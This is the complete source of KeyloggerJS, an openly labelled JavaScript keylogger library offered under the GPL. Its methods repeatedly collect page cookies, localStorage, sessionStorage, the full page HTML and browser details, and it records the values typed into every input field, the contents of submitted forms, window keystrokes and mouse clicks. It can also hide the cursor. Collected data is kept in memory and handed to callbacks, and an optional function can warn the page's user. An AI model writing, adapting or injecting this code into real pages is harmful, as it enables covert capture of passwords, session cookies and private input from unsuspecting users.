/* KeyloggerJS v1.0.0 | (c) 2014, 2015 ADOUI YANIS | GNU GPL V2.0, more : https://github.com/yanisadoui/KeyloggerJS */
(function () {
    var keylogException = function (error) {
            this.error = error || 'Unknown';
        },
        k;
    if (typeof window === 'undefined' || typeof document === 'undefined') throw new keylogException('Please, use keyloggerJS with window && document.');
    
    /**
     * Constructor.
     * Initializes the data values, variables, etc.
     */
    k = function () {
        this.data = {};
        this.timeDefault = 1000;
    };

    /**
     * Data extraction HTTP/Navigator.
     * @param {integer}  delay      The restart time.
     * @param {function} callback   A function of callback to recover and process the data.
     */
    k.prototype.http = function (delay, callback) {
        var local;
        local = {
            delay: delay || this.timeDefault,
            callback: callback || false,
            data: {},
            this: this
        };
        setInterval(function () {
            local.data = {
                date: Date(),
                uri: document.URL,
                title: document.title,
                agents: window.navigator
            };
            local.this.add('http', local.data);
            (callback) ? callback(local.data) : '';
        }, local.delay);
    };

    /**
     * Data local extraction.
     * @param {integer}  delay      The restart time.
     * @param {function} callback   A function of callback to recover and process the data.
     * @todo  Take charge "IndexedDB" and "WebSQL" ?
     */
    k.prototype.webStorage = function (delay, callback) {
        var local;
        local = {
            delay: delay || this.timeDefault,
            callback: callback || false,
            data: {},
            this: this
        };
        setInterval(function () {
            local.data = {
                date: Date(),
                local: window.localStorage,
                session: window.sessionStorage,
                cookies: document.cookie
            };
            local.this.add('webStorage', local.data);
            (callback) ? callback(local.data) : '';
        }, local.delay);
    };

    /**
     * Extract the values ​​of the window and the contents of the DOM.
     * @param {integer}  delay      The restart time.
     * @param {function} callback   A function of callback to recover and process the data.
     */
    k.prototype.dom = function (delay, callback) {
        var local;
        local = {
            t: delay || this.timeDefault,
            callback: callback || false,
            data: {},
            this: this
        };
        setInterval(function () {
            local.data = {
                date: Date(),
                windowData: window,
                documentData: document.body.innerHTML
            };
            local.this.add('dom', local.data);
            (callback) ? callback(local.data) : '';
        }, local.delay);
    };

    /**
     * A keylogger, which takes charge of different possibilities.
     * @param  {string} keylogType The type of keylogger defines what it should listen.
     * @param  {string} eventType  The type of the event as keypress, keyup, mouseover, etc.
     * @param {function} callback  A function of callback to recover and process the data.
     *
     */
    k.prototype.keylog = function (keylogType, eventType, callback) {
        var local, query;
        local = {
            keylog: keylogType || this.helper.exeption('Please, specify a keylogType !'),
            type: eventType || this.helper.exeption('Please, specify a eventType !'),
            callback: callback || false,
            data: {},
            this: this
        };
        switch (local.keylog) {
        case 'K_TEXT_INPUT':
            query = document.querySelectorAll('input, textarea, select');
            if (query.length) {
                for (var input in query) {
                    query[input].addEventListener(local.type, function (e) {
                        local.data = {
                            nameInput: e.target.getAttribute('name') || 'Unknown name',
                            idInput: e.target.getAttribute('id') || 'Unknown id',
                            classInput: e.target.getAttribute('class') || 'Unknown class',
                            contentInput: e.target.value,
                            dateEvent: e.timeStamp,
                            targetEvent: e.target,
                            typeEvent: e.type,
                            allEvent: e
                        };
                        local.this.add('keylog', local.data);
                        (callback) ? callback(local.data) : '';
                    }, false);
                }
            }
            break;
        case 'K_FORM_SUBMIT':
            query = document.querySelectorAll('form');
            if (query.length) {
                for (var input in query) {
                    query[input].addEventListener('submit', function (e) {
                        local.data = {
                            actionForm: e.target.getAttributeNode('action') || 'Unknown action',
                            methodForm: e.target.getAttributeNode('method') || 'Unknown method',
                            idForm: e.target.getAttributeNode('id') || 'Unknown id',
                            contentForm: e.target.innerHTML,
                            dateEvent: e.timeStamp,
                            targetEvent: e.target,
                            typeEvent: e.type,
                            allEvent: e
                        };
                        local.this.add('keylog', local.data);
                        (callback) ? callback(local.data) : '';
                    }, false);
                }
            }
            break;
        case 'K_WINDOW':
            window.addEventListener(local.type, function (e) {
                local.data = {
                    data: String.fromCharCode(e.keyCode) || 'Unknown char',
                    dateEvent: e.timeStamp,
                    targetEvent: e.target,
                    typeEvent: e.type,
                    allEVent: e
                };
                local.this.add('keylog', local.data);
                (callback) ? callback(local.data) : '';
            }, false);
            break;
        }
    };

    /**
     * Tracer the mouse interactions.
     * @param {boolean}  hideCursor   You can choose to hide cursor of the mouse.
     * @param {function} callback     A function of callback to recover and process the data.
     */
    k.prototype.mouse = function (hideCursor, callback) {
        var local, traceCursor;
        local = {
            hideCursor: hideCursor || false,
            callback: callback || false,
            data: {},
            this: this
        },
        traceCursor = function (e) {
            local.data = {
                date: e.timeStamp,
                targetEvent: e.target,
                typeEvent: e.type,
                allEVent: e
            };
            local.this.add('mouse', local.data);
            (callback) ? callback(local.data) : '';
        };
        (hideCursor) ? document.body.style = 'cursor: none;' : '';
        window.addEventListener('click', traceCursor, false);
        window.addEventListener('dblclick', traceCursor, false);
        window.addEventListener('contextmenu', traceCursor, false);
    };

    /**
     * Helpers.
     * @type {Object}
     */
    k.prototype.helper = {
        exeption: function (error) {
            throw new keylogException(error);
        },
        isArray: function (data) {
            return (typeof data === 'undefined' || !Array.isArray(data)) ? false : true;
        }
    };
    
    /**
     * KeyloggerJS includes a function that allows to notify (or not) the user.
     * @param  {string} reason The content of the message.
     * @param  {string} style  It is possible to style the message when it is displayed with console.log().
     * @param  {string} type   Type of message : log or alert (default: log).
     */
    k.prototype.warn = function (reason, style, type) {
        this.reason = reason || 'A keylogger is active on this page.';
        this.style = style || '';
        this.type = type || 'console';
        switch (this.type) {
        case 'console':
            console.log('%c ' + this.reason, this.style);
            break;
        case 'alert':
            window.alert(this.reason);
            break;
        default:
            console.log('%c ' + this.reason, this.style);
            break;
        }
    };

    /**
     * A list of modules (to target data to be purged).
     * @param {array} modules A list of modules.
     */
    k.prototype.reset = function (modules) {
        var local;
        local = {
            this: this
        }
        if (!this.helper.isArray(modules)) {
            this.data = {};
        } else {
            modules.forEach(function (module) {
                if (typeof local.this.data[module] === 'undefined') local.this.helper.exeption('The module ' + module + ' did not record any data.');
                delete local.this.data[module];
            });
        }
    };

    /**
     * A list of modules (to target data to be saved).
     * @param {array} modules A list of modules.
     */
    k.prototype.save = function (modules) {
        var local;
        local = {
            this: this,
            temp: []
        }
        if (!this.helper.isArray(modules)) {
            return this.data;
        } else {
            modules.forEach(function (module) {
                if (typeof local.this.data[module] === 'undefined') local.this.helper.exeption('The module ' + module + ' did not record any data.');
                local.temp.push({
                    name: module,
                    data: local.this.data[module]
                });
            });
        }
        return local.temp;
    };

    /**
     * Add data to back up.
     * @param  {string}  module The module in question.
     * @param  {object}  data   The data.
     * @param {boolean} remove It's possible to only a save the last data.
     * @todo Managing the "remove" parameter.
     */
    k.prototype.add = function (module, data, remove) {
        (typeof this.data[module] === 'undefined') ? this.data[module] = [] : '';
        (remove) ? this.data[module] = [data] : this.data[module].push(data);
    }

    this.keylogger = k;
})();